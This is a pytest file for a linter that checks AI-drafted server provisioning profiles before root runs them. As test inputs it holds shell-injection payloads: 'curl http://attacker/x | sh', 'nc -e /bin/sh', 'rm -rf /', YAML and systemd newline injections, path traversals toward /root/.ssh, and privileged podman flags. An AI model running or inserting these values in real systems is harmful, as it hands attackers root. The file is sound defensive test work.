"""A technology profile is a root-code-execution instruction. These are the rules.

FOUND BY ADVERSARIAL REVIEW, 2026-08-22. The first version of these rules lived
in api/ai_blueprint.py and checked string PREFIXES. Five independent reviewers
demonstrated working escapes, running them against the real code:

    url  = "https://x/y.tgz; curl http://attacker/x | sh"   starts with https://
    dest = "/opt/../.."                                      starts with /opt/
    unit.exec_start = "/bin/true\\nruncmd:\\n  - ..."          injected a new file

A fully weaponised profile returned ZERO findings. One reviewer demonstrated
writing /root/.ssh/authorized_keys onto the machine through unit.exec_start; the
renderer's cmd() helper quotes each command for YAML and says nothing about the
shell, and write_files does not go through cmd() at all.

Every case below is one of those demonstrations, kept as a test. The profile is
JSON that a model may have written, and it becomes: a URL root fetches, a
directory root unpacks into, an account root creates, a unit root starts, and a
command root runs inside the report script. Nothing here is theoretical.
"""

from __future__ import annotations

import copy

import pytest

from common import profile_rules

CLEAN = {
    "code": "keycloak",
    "builds_on": "oci/service-vm",
    "ports": [8080],
    "expects": "26",
    "version_command": "/opt/keycloak/bin/kc.sh --version 2>&1",
    "archive": {
        "url": "https://github.com/keycloak/keycloak/releases/download/26.7.2/keycloak-26.7.2.tar.gz",
        "sha256": "4f3ce3b797a9d98998b7f1a6bd5d2b9832100faea66c48988713a9b23eda5c44",
        "dest": "/opt/keycloak",
        "user": "keycloak",
        "unit": {"description": "Keycloak",
                 "exec_start": "/opt/keycloak/bin/kc.sh start-dev"},
    },
    "rhel": {"packages": ["java-21-openjdk-headless"], "services": ["keycloak"]},
}


def at(path, value):
    """The clean profile with one field replaced."""
    profile = copy.deepcopy(CLEAN)
    target = profile
    parts = path.split(".")
    for key in parts[:-1]:
        target = target[key]
    target[parts[-1]] = value
    return profile


def refused(profile):
    return profile_rules.profile_problems(profile)


def test_the_real_keycloak_profile_is_acceptable():
    """The rules must not be so strict that the thing they exist to allow fails."""
    assert refused(CLEAN) == []


# --- the demonstrated escapes ------------------------------------------------

@pytest.mark.parametrize("path,value,what", [
    ("archive.url", "https://x/y.tgz; curl http://attacker/x | sh",
     "a semicolon in the URL is a root command"),
    ("archive.url", "https://x/y.tgz && wget http://attacker/x",
     "so is a conjunction"),
    ("archive.url", "http://x/y.tgz", "plain http lets the network substitute the archive"),
    ("archive.dest", "/opt/../..", "tar -C / writes an attacker tree over the base system"),
    ("archive.dest", "/opt/x; rm -rf /", "a prefix check says nothing about the rest"),
    ("archive.user", "u; nc -e /bin/sh attacker 1", "useradd and chown take this as root"),
    ("archive.unit.exec_start", "/bin/true\nruncmd:\n  - \"touch /tmp/pwned\"",
     "a newline ends the YAML block scalar and injects cloud-init structure"),
    ("archive.unit.description", "x\n  - path: /root/.ssh/authorized_keys",
     "the demonstrated authorized_keys write"),
    ("version_command", "true; curl http://attacker/rk.sh | sh",
     "this runs as root inside the report script"),
    ("version_command", "v $(curl http://attacker)", "so does a substitution"),
    ("rhel.packages", ["java; rm -rf /"], "package names are passed to dnf as root"),
    ("rhel.services", ["kc; reboot"], "service names are passed to systemctl as root"),
    ("code", "kc; rm -rf /", "the code becomes a unit name and a file name"),
])
def test_a_demonstrated_escape_is_refused(path, value, what):
    problems = refused(at(path, value))
    assert problems, f"NOT REFUSED — {what}: {path}={value!r}"


# --- what a checksum is for ---------------------------------------------------

def test_a_missing_checksum_is_a_BLOCKER_not_a_warning():
    """This was a warning for one afternoon, reasoning that TLS plus a sandbox
    bounded it. TLS authenticates the host a profile NAMES; it says nothing about
    whether that host serves the software the profile claims — and with a model
    choosing the host, that is the entire question."""
    profile = copy.deepcopy(CLEAN)
    del profile["archive"]["sha256"]
    assert refused(profile), "root would execute bytes nothing has verified"


@pytest.mark.parametrize("sha", ["", "abc", "A" * 64, "g" * 64, "a" * 63])
def test_a_checksum_that_is_not_a_sha256_is_refused(sha):
    assert refused(at("archive.sha256", sha))


# --- a recipe must install something, and prove which version -----------------

def test_a_profile_that_installs_nothing_is_refused():
    """Relaxing the packages rule for archives briefly allowed no packages, no
    services and no ports: it unpacked a tarball, started nothing, and reported
    healthy. A proof of nothing — the third one this project shipped in a day."""
    profile = copy.deepcopy(CLEAN)
    del profile["archive"]
    profile["rhel"] = {"packages": [], "services": []}
    assert refused(profile)


def test_an_archive_that_starts_nothing_is_refused():
    """A machine that installs software and runs none of it reports healthy while
    doing nothing."""
    assert refused(at("rhel.services", []))


def test_a_version_command_with_no_expectation_is_refused():
    """Asking the machine its version and comparing the answer to nothing is a
    question nobody reads — the silence that shipped Redis 6.2 as Redis 7."""
    assert refused(at("expects", ""))


@pytest.mark.parametrize("command", [
    "nginx -v 2>&1", "redis-server --version 2>&1", "python3.12 --version",
    "java -version 2>&1", "node --version",
    "/opt/keycloak/bin/kc.sh --version 2>&1",
])
def test_the_real_version_commands_are_still_accepted(command):
    """The shipped catalogue's own commands. A rule that refused these would take
    version checking off every machine to prevent an injection."""
    assert refused(at("version_command", command)) == []


# --- formats the renderer cannot actually unpack ------------------------------

def test_a_zip_is_refused_with_the_reason():
    """HashiCorp ships Vault as a zip only. The renderer runs `tar -xzf`, so a
    zip fails on every machine and the candidate is withdrawn as an uncertifiable
    recipe — when the defect is in our renderer. Say which."""
    problems = refused(at("archive.url", "https://releases.hashicorp.com/vault/1.18.3/vault_1.18.3_linux_amd64.zip"))
    assert problems and any("tar -xzf" in p for p in problems)


# --- malformed input must be refused, never raise -----------------------------

@pytest.mark.parametrize("value", ["kc.service", 42, ["a"], None])
def test_a_unit_that_is_not_an_object_is_refused_without_raising(value):
    """A model returning `"unit": "keycloak.service"` made the linter throw
    AttributeError instead of returning findings, which 500s the drafting
    endpoint and takes the autonomous catalogue path down with it."""
    problems = refused(at("archive.unit", value))
    assert problems, f"unit={value!r} was accepted"


@pytest.mark.parametrize("value", [["KC_DB=postgres"], "KC_DB=postgres", 7])
def test_an_environment_that_is_not_an_object_is_refused_without_raising(value):
    """`["KC_DB=postgres"]` is the natural systemd shape a model would emit, and
    it crashed render() in the orchestrator with AttributeError."""
    assert refused(at("archive.unit.environment", value))


@pytest.mark.parametrize("profile", [None, "a string", 42, [], {}])
def test_a_profile_that_is_not_a_profile_is_refused_without_raising(profile):
    assert profile_rules.profile_problems(profile)


# --- report keys must survive the verdict parser ------------------------------

def test_a_hyphenated_code_becomes_an_identifier():
    """boot_reports.verdict() parses a line only when its key isidentifier(), and
    catalogue codes contain hyphens (oracle-db, service-mesh, api-gateway). So
    `archive_oracle-db=failed` was read as healthy and thrown away."""
    assert profile_rules.report_key("oracle-db") == "oracle_db"
    assert f"archive_{profile_rules.report_key('oracle-db')}".isidentifier()
    assert f"version_{profile_rules.report_key('api-gateway')}".isidentifier()


def test_the_refusal_says_what_is_wrong_and_what_is_acceptable():
    """A refusal that does not say what to do next is half a refusal — and the
    reader here may be an agent redrafting."""
    problems = refused(at("archive.dest", "/etc"))
    assert problems and any("/opt" in p for p in problems)


# --- a repository that arrives as a package (C7) -------------------------------
#
# EPEL is enabled by installing a release package, not by fetching a .repo file,
# so the URL rules cannot express it. A release package installs a repository
# definition AND its signing key in one step — which is precisely why the set of
# them is CLOSED. "Any package whose name ends in -release" would let a drafted
# profile, or a machine's own report, nominate an arbitrary publisher and have
# root trust it permanently for every package it will ever serve.
#
# This block exists because a plant test on 2026-08-23 replaced the closed-set
# check with exactly that suffix rule and NOTHING FAILED. The rule was right and
# nothing was holding it there.

def test_the_sanctioned_release_packages_are_accepted():
    for name in profile_rules.RELEASE_PACKAGES:
        assert profile_rules.repo_problems({"release_package": name}) == []


@pytest.mark.parametrize("name", [
    "attacker-release",          # the suffix trap: shaped right, unknown publisher
    "evil-epel-release-el9",     # a near-miss on a sanctioned name
    "oracle-epel-release-el8",   # plausible, and not what this image trusts
    "epel-release; curl http://attacker/x | sh",
    "../../etc/passwd",
    "", None, 7, [],
])
def test_any_other_release_package_is_refused(name):
    """Root would trust this publisher for everything it ever serves."""
    assert profile_rules.repo_problems({"release_package": name}), (
        f"{name!r} would have been installed as a repository")


def test_a_repository_may_not_be_both_a_package_and_a_url():
    """Two repositories added under one declaration, only one of which anything
    checked."""
    assert profile_rules.repo_problems({
        "release_package": "oracle-epel-release-el9",
        "url": "https://attacker.example/x.repo",
        "gpg_key": "https://attacker.example/gpg"})


def test_a_release_package_repository_needs_no_separate_gpg_key():
    """Unlike a .repo URL, where the key is a separate mandatory fetch: the
    release package carries the key itself, and demanding one anyway would
    make the only sanctioned no-internet repository unusable."""
    assert profile_rules.repo_problems(
        {"release_package": "oracle-epel-release-el9"}) == []


# --- path traversal, in the MIDDLE of a path (found 2026-08-24) ---------------
#
# A LIVE BUG IN SHIPPED CODE, not a hardening exercise. `DEST` is where root
# unpacks a downloaded tarball and then runs `chown -R`. Its per-segment
# lookahead was anchored to end-of-string, so it refused a TRAILING `..` and
# nothing else:
#
#     /opt/../..                  refused    <- the only form ever tested
#     /opt/a/../../../root/.ssh   ACCEPTED
#
# The adversarial review of 2026-08-22 tested the trailing form, saw it refused,
# and the comment above DEST then claimed `..` was impossible by construction.
# It was not. Found while writing the equivalent rule for container data
# directories — by testing the middle of the path instead of the end.
#
# Every one of these must stay refused, and the two confined paths share one
# segment rule so they cannot drift apart again.

TRAVERSALS = [
    "/opt/..", "/opt/.", "/opt/../..", "/opt/../../etc",
    "/opt/a/../../../root/.ssh", "/opt/./../etc", "/opt/a/./b", "/opt/a/../b",
]


@pytest.mark.parametrize("path", TRAVERSALS)
def test_no_dot_segment_survives_anywhere_in_a_destination(path):
    assert not profile_rules.DEST.match(path), (
        f"{path} would be unpacked into by root")


@pytest.mark.parametrize("path", [p.replace("/opt", "/var/lib") for p in TRAVERSALS])
def test_no_dot_segment_survives_in_a_data_directory(path):
    assert not profile_rules.DATA_DIR.match(path), (
        f"{path} would be bind-mounted into a container by root")


@pytest.mark.parametrize("path", ["/opt/thing", "/opt/keycloak/data",
                                  "/opt/a.b-c", "/opt/x/y/z"])
def test_ordinary_destinations_are_untouched(path):
    """The fix must not overshoot: a dot INSIDE a segment is ordinary."""
    assert profile_rules.DEST.match(path)


@pytest.mark.parametrize("path", ["/var/lib/rabbitmq", "/var/lib/pgsql/data"])
def test_ordinary_data_directories_are_accepted(path):
    assert profile_rules.DATA_DIR.match(path)


@pytest.mark.parametrize("ref", ["a/../b", "..", ".", "./x", "a/./b"])
def test_an_image_path_cannot_climb_either(ref):
    assert not profile_rules.IMAGE_PATH.match(ref)


def test_the_archive_linter_actually_refuses_a_traversing_destination():
    """Not a duplicate of the pattern tests: this asserts the LINTER calls them.
    It once had its own prefix-checking copy that let everything through."""
    profile = {
        "code": "thing", "builds_on": "oci/service-vm", "ports": [1234],
        "expects": "3", "version_command": "/opt/thing/bin/thing --version",
        "archive": {"url": "https://example.com/t.tar.gz", "sha256": "a" * 64,
                    "dest": "/opt/a/../../../root/.ssh", "user": "thing",
                    "unit": {"exec_start": "/opt/thing/bin/thing run"}},
        "rhel": {"packages": [], "services": ["thing"]},
    }
    assert profile_rules.profile_problems(profile), (
        "a profile unpacking a tarball into /root/.ssh was accepted")


# --- containers (C8) ----------------------------------------------------------
#
# Pulling an image is executing whatever its publisher put in it, as whatever
# user the image declares. That is closer to an archive than to a package — one
# specific artifact, fetched and run — so it gets an archive's discipline.
#
# THE FIELD ALLOW-LIST IS THE LOAD-BEARING PART. A profile declares data; the
# renderer builds the podman command. If a profile could contribute to that
# command line, `--privileged` or `-v /:/host` ends the discussion and no care
# over the image name matters.

def container(**over):
    base = {"image": "docker.io/library/rabbitmq", "tag": "4.1-management",
            "digest": "sha256:" + "a" * 64,
            "data_dir": "/var/lib/rabbitmq", "data_mount": "/var/lib/rabbitmq"}
    base.update(over)
    return base


def test_a_pinned_image_from_a_known_registry_is_accepted():
    assert profile_rules.container_problems(container()) == []


def test_the_digest_is_not_optional():
    """A tag can be repointed by its publisher AFTER this recipe was proved, so
    what the proof certified and what a later request installs would be
    different things wearing the same name."""
    assert profile_rules.container_problems(container(digest=None))
    no_digest = {k: v for k, v in container().items() if k != "digest"}
    assert profile_rules.container_problems(no_digest)


@pytest.mark.parametrize("digest", [
    "sha256:" + "A" * 64, "sha256:" + "a" * 63, "sha256:zz", "a" * 64,
    "md5:" + "a" * 32, "sha256:", 12345,
])
def test_a_digest_that_is_not_a_sha256_is_refused(digest):
    assert profile_rules.container_problems(container(digest=digest))


@pytest.mark.parametrize("image", [
    "evil.example.com/x/y",          # a registry nobody sanctioned
    "docker.io.attacker.net/x/y",    # a near-miss on a sanctioned name
    # THE SUFFIX TRAP. Every hostile case above happens not to end in `.io`, so
    # replacing the closed set with `registry.endswith(".io")` passed the whole
    # file — the same hole a plant found in RELEASE_PACKAGES the day before,
    # where "any name ending in -release" also passed. A pattern is not a list.
    "attacker.io/evil/image",
    "quay.io.attacker.io/x/y",
    "registry.io/x/y",
    "rabbitmq",                      # unqualified: the machine's search decides
    "docker.io/a/../b",              # climbing out of the repository path
    "", None, 42,
])
def test_an_image_from_anywhere_else_is_refused(image):
    assert profile_rules.container_problems(container(image=image))


@pytest.mark.parametrize("field,value", [
    ("privileged", True),
    ("volumes", ["/:/host"]),
    ("network", "host"),
    ("command", "sh -c 'curl http://attacker/x | sh'"),
    ("user", "root"),
    ("cap_add", ["SYS_ADMIN"]),
    ("podman_args", "--privileged"),
])
def test_a_profile_may_never_contribute_a_flag(field, value):
    """THE rule this rung stands on. Refused rather than ignored: ignoring an
    unvalidated key is how it comes to be rendered later by someone who assumed
    it had been checked."""
    problems = profile_rules.container_problems(container(**{field: value}))
    assert problems, f"{field}={value!r} was accepted onto a podman command line"


@pytest.mark.parametrize("path", [
    "/var/lib/../../etc", "/var/lib/a/../../root/.ssh", "/etc", "/", "/opt/x",
    "relative/path", "/var/lib/x:/host",
])
def test_the_host_side_of_the_mount_stays_confined(path):
    assert profile_rules.container_problems(container(data_dir=path))


@pytest.mark.parametrize("path", ["/data:/host", "/a/../b", "not-absolute", ""])
def test_the_container_side_cannot_inject_another_mount(path):
    assert profile_rules.container_problems(container(data_mount=path))


def test_a_mount_needs_both_halves():
    """One without the other mounts nothing, or mounts it nowhere — and a
    container that silently stores its data inside itself loses it on the first
    restart, which looks like a working service until it isn't."""
    assert profile_rules.container_problems(
        {k: v for k, v in container().items() if k != "data_mount"})
    assert profile_rules.container_problems(
        {k: v for k, v in container().items() if k != "data_dir"})


def test_an_environment_value_cannot_break_out_of_the_unit_file():
    """A value becomes the right-hand side of `Environment=NAME=value` in a
    file systemd reads as root, so a newline in one is a second directive."""
    assert profile_rules.container_problems(
        container(environment={"X": "a\nExecStart=/bin/sh"}))
    assert profile_rules.container_problems(container(environment="X=1"))


def test_an_environment_name_may_be_dotted_and_lowercase():
    """RE-POINTED 2026-08-30. The test above also asserted that a lowercase
    NAME was a problem — a spelling rule smuggled into a test about VALUES.

    REQ-2026-0237 is what that cost. Elasticsearch failed its production
    bootstrap checks and shut itself down, and one half of the fix is a
    single setting — `discovery.type=single-node`. The portal offers an
    operator channel for exactly this and then refused to carry the name.
    Elasticsearch, OpenSearch and others name their settings this way, and
    podman passes them through unchanged.

    What the name still may not contain is anything that would break
    `Environment=NAME=value` — whitespace, a dash, or a leading digit."""
    assert profile_rules.container_problems(
        container(environment={"discovery.type": "single-node"})) == []
    assert profile_rules.container_problems(
        container(environment={"lower_case": "x"})) == []

    assert profile_rules.container_problems(
        container(environment={"has space": "x"}))
    assert profile_rules.container_problems(
        container(environment={"HAS-DASH": "x"}))
    assert profile_rules.container_problems(
        container(environment={"9lives": "x"}))


def test_a_container_counts_as_installing_something():
    """The installs-nothing rule predates containers and asks about packages and
    archives. A container profile legitimately declares neither."""
    profile = {"code": "rabbitmq", "builds_on": "oci/service-vm",
               "ports": [5672], "version_command": "podman exec rabbitmq true",
               "container": container(),
               "rhel": {"packages": [], "services": ["rabbitmq"]}}
    assert profile_rules.profile_problems(profile) == [], (
        profile_rules.profile_problems(profile))


def test_the_profile_linter_actually_calls_the_container_rules():
    """Not a duplicate: this asserts the gate is wired. The API's archive linter
    once had its own prefix-checking copy, and a weaponised profile passed it
    with zero findings."""
    profile = {"code": "rabbitmq", "builds_on": "oci/service-vm", "ports": [5672],
               "version_command": "podman exec rabbitmq true",
               "container": container(image="evil.example.com/x/y"),
               "rhel": {"packages": [], "services": ["rabbitmq"]}}
    assert profile_rules.profile_problems(profile)


def test_only_a_PINNED_container_is_excused_the_version_question():
    """The exemption exists because a pinned digest identifies what is running
    EXACTLY — more precisely than any version string. Without the pin it
    identifies nothing, and excusing it would drop both checks at once.

    Defence in depth: an unpinned container is already refused for the missing
    digest, so this is not a live hole. It is a guard against the two rules
    drifting apart — a plant that widened the exemption to ANY container passed
    all 125 tests in this file.
    """
    unpinned = {"code": "x", "builds_on": "oci/service-vm", "ports": [],
                "container": {"image": "docker.io/library/x", "digest": "not-a-digest"},
                "rhel": {"packages": [], "services": ["x"]}}
    problems = profile_rules.profile_problems(unpinned)
    assert any("digest" in p for p in problems), problems
    assert any("what it actually received" in p for p in problems), (
        f"an unpinned container was excused the version question too: {problems}")


def test_a_pinned_container_is_excused_it_and_nothing_else_is():
    pinned = {"code": "x", "builds_on": "oci/service-vm", "ports": [],
              "container": {"image": "docker.io/library/x",
                            "digest": "sha256:" + "a" * 64},
              "rhel": {"packages": [], "services": ["x"]}}
    assert profile_rules.profile_problems(pinned) == []

    # An archive, a repo and a plain package profile all still owe an answer.
    for extra in ({"rhel": {"packages": ["x"], "services": ["x"]}},
                  {"repo": {"release_package": "oracle-epel-release-el9"},
                   "rhel": {"packages": ["x"], "services": ["x"]}}):
        profile = {"code": "x", "builds_on": "oci/service-vm", "ports": [], **extra}
        assert any("what it actually received" in p
                   for p in profile_rules.profile_problems(profile)), profile
